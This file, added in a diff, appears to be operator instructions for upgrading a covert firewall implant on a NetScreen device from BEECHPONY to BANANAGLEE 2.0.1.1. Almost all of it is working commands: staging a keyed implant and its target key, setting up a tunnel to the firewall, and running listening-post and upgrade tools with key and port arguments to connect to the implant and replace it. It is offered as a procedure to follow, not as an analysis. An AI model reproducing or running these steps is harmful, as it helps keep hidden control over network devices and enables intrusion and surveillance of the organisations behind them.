@@ -1,0 +1,50 @@
+##### Upgrading a netscreen from a version of beechpony to BG 2.0.1.1  #####
+# This is an on the fly upgrade. After you run the upgrade script, you'll have a running version of BG 2.0.1.1 on the target netscreen box.
+
+# These instructions assume you've already created the BG implant for this NS box and named it "project.ip_bg2011_ppc_implant".
+# You also need the key for this target. You'll use the same project.ip.key for BG that was used for BP.
+
+# First connect to the netscreen with the LP and verify you can connect, and that the version of BP is what you think it is.
+# Second verify with the analyst if this target has a unilateral or multilateral implant on it.
+# Last upgrade it.
+
+######
+
+# Copy the fw.zip to /current/bin/ and unzip it.
+cp /mnt/zip/fw.zip /current/bin/
+unzip /current/bin/fw.zip
+
+# Copy the keyed BG 2.0.1.1 target implant to the BP upgrade directory
+cp /mnt/zip/project.ip_bg2011_ppc_implant /current/bin/FW/BANANAGLEE_2.0.1.1/Install/Implant/BANANAGLEE-BEECHPONY_UPGRADE_1.0.0.0
+
+# Copy the target project.ip.key to the BP upgrade directory
+cp /mnt/zip/project.ip.key /current/bin/FW/BANANAGLEE_2.0.1.1/Install/Implant/BANANAGLEE-BEECHPONY_UPGRADE_1.0.0.0
+
+# Go to the BP Upgrade directory
+cd /current/bin/FW/BANANAGLEE_2.0.1.1/Install/Implant/BANANAGLEE-BEECHPONY_UPGRADE_1.0.0.0/bp_utils
+
+## For multilateral implant:
+# Use lp_2p for the lp, use upgrade_2p for the upgrading script.
+
+## For unilateral implant:
+# Use lp for the lp, use upgrade for the upgrading script.
+
+# Setup tunnel on pitch
+-tunnel
+u 48045 <firewall ip> 500 500
+
+# Connect to the implant to verify it's running:
+./lp_2p --lp 127.0.0.1 --implant 127.0.0.1 --idkey ../project.ip.key --hash sha1 --timeout 10 --sport 35686 --dport 48045
+
+# Go back one dir to where the upgrade and upgrade_2p scripts are at.
+cd ../
+
+# Now lets upgrade...
+./upgrade_2p --lp 127.0.0.1 --implant 127.0.0.1 --idkey project.ip.key --sport 35686 --dport 48045 --file project.ip_bg2011_ppc_implant
+
+# Now you can use the BG 2.0.1.1 lp to connect to your new BG implant using the same key :)
+cd bg_utils
+
+# Connect to it and open a session. You should see "Implant Version: 2.0.1".
+./lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey ../project.ip.key --hash sha1 --timeout 10 --sport 35686 --dport 48045
+
